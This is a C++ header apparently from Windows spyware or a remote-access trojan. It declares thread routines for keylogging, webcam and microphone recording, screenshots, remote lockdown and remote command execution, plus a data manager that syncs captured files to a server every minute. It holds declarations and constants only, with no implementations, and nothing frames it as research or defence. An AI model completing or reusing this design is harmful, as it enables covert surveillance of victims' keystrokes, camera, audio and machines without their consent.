#pragma once
#include <windows.h>
#include "../Control/Keylogger.h"
#include "../Control/Recorder.h"
#include "../Control/Camera.h"
#include "../DataManagement/Converters.h"
#include "../Network/Connect.h"
#include "../Control/Screenshoter.h"
#include "../Control/Lockdown.h"
#include "../Network/ApiOperations.h"
#include <string>
#include <iterator>
#include <set>

#define Camera "CAMERA"
#define Keylog "KEYLOG"
#define Audio "AUDIO"
#define Screenshot "SCREENSHOT"
#define Lockdown "LOCKDOWN"
#define Command "COMMAND"
#define DATA_ID "dataId"

#define CAMERA_CODE "a0"
#define AUDIO_CODE "a1"
#define SCREENSHOT_CODE "a2"
#define KEYLOG_CODE "a3"
#define CMD_CODE "a4"
#define UNDEFINED_CODE ""
#define DATA_FOLDER_PATH "temp/"

struct CompareDates {
	bool operator() (WIN32_FIND_DATA data1, WIN32_FIND_DATA data2) const {
		return data1.ftCreationTime.dwLowDateTime < data2.ftCreationTime.dwLowDateTime;
	}
};

#pragma warning(disable:4996) // Disable "unsafe" warnings
#define SYNC_TIME 60000 // 1 minute

DWORD WINAPI initFiltering(LPVOID lpParam);
DWORD WINAPI initKeylogger(LPVOID lpParam);
DWORD WINAPI initScreenshot(LPVOID lpParam);
DWORD WINAPI initCamera(LPVOID lpParam);
DWORD WINAPI initMic(LPVOID lpParam);
DWORD WINAPI initRemoteLockdown(LPVOID lpParam);
DWORD WINAPI initRemoteCommands(LPVOID lpParam);
DWORD WINAPI initDataManager(LPVOID lpParam);
DWORD WINAPI initRequestManager(LPVOID lpParam);
BOOL initRequest(map<string, map<string, string>> allRequests, const char* requestName, HANDLE requestHandle);
string checkDataType(char* filename);
string constructFilename(const char* typeCode);
wstring stringToWString(string str);
string getRandomString(const int len);